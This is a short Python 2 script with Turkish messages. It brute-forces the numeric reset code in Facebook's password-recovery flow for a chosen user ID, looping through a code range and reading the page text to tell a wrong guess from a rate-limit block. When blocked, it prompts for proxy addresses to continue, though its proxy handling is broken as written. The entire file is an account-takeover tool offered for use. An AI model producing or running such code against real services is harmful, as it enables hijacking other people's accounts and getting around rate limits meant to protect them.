import urllib
import sys


try:
	user_id = sys.argv[1]
	bas = int(sys.argv[2])
	son = int(sys.argv[3])
	print "[+] OK."

except:
	print "[!] Kodlari oku Lutfen..!"
	exit()


link = "https://www.beta.facebook.com/recover/password?u=" + user_id + "&n="

sayi = bas #101000

while sayi < son: #999999
	acilacak_link = link + str(sayi)
	html_kod = urllib.urlopen(acilacak_link).read()
	if "tfen tekrar dene." in html_kod:
		print "[:(] Malesef:",sayi
	elif "deniyorsun" in html_kod:
		break
	else:
		print "-" * 45
		print "[:)] Bulundu:							",sayi
		print "[+] Site:", acilacak_link
		print "-" * 45
		exit()
	sayi += 1



p = raw_input("Proxy ex.https://ip:port  :")


while sayi < son:
	acilacak_link = link + str(sayi)
	proxy = { "https" : p }
	html_kod = urllib.urlopen(acilacak_link).read()
	if "tfen tekrar dene." in html_kod:
		print "[:(] Malesef:",sayi
	elif "deniyorsun" in html_kod:
		p = raw_input("Proxy ex.ip:port  :")
		sayi -= 1
	else:
		print "-" * 45
		print "[:)] Bulundu:							",sayi
		print "[+] Site:", acilacak_link
		print "-" * 45
		exit()
	sayi += 1



























#		p = raw_input("proxy gir ex.ip:port :>>: ")

#		proxy = { "http" : p }
#		try:
#			print urllib.urlopen("http://www.icanhazip.com").read()
#			print "-" * 30
#			print urllib.urlopen("http://www.icanhazip.com", proxies = proxy).read()
#		except:
#			print "kocaman hata mesai gorecegine bunu gor bagrii"
